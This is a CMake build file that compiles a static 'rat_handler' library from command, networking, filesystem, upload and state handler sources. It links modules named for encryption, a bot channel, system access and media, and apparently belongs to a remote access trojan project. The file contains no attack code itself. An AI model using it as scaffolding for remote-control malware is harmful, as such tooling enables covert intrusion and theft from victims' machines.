# ======================================
# Sources
# ======================================
set(SRC_DIR ${CMAKE_CURRENT_SOURCE_DIR}/src)
set(HANDLER_SRC
    ${SRC_DIR}/init.cpp
    ${SRC_DIR}/handleUpdate.cpp
    ${SRC_DIR}/handlers.cpp
    ${SRC_DIR}/handleHelpCommand.cpp    
    ${SRC_DIR}/networking_handlers.cpp
    ${SRC_DIR}/filesystem_handlers.cpp
    ${SRC_DIR}/handleUploadedFiles.cpp
    ${SRC_DIR}/helpers.cpp
    ${SRC_DIR}/RatState.cpp
    ${SRC_DIR}/threaded_handlers.cpp
)

# ======================================
# Library target (controlled by root: BUILD_STATIC)
# ======================================
add_library(rat_handler STATIC ${HANDLER_SRC})

target_include_directories(rat_handler
    PUBLIC
        ${CMAKE_CURRENT_SOURCE_DIR}/include
)

# ======================================
# Dependencies (all injected from root)
# ======================================
target_link_libraries(rat_handler
    PUBLIC
        rat_process
        rat_encryption
        rat_networking
        rat_threading
        rat_tbot
        rat_system
        rat_media
)

# Windows extras
if(WIN32)
    target_link_libraries(rat_handler PUBLIC ws2_32 wldap32 crypt32 normaliz)
else()
    target_link_libraries(rat_handler PUBLIC pthread)
endif()

# ======================================
# Debug logging (root DEBUG flag)
# ======================================
if(DEBUG)
    target_link_libraries(rat_handler PUBLIC spdlog::spdlog)
    target_compile_definitions(rat_handler PUBLIC DEBUG)
endif()

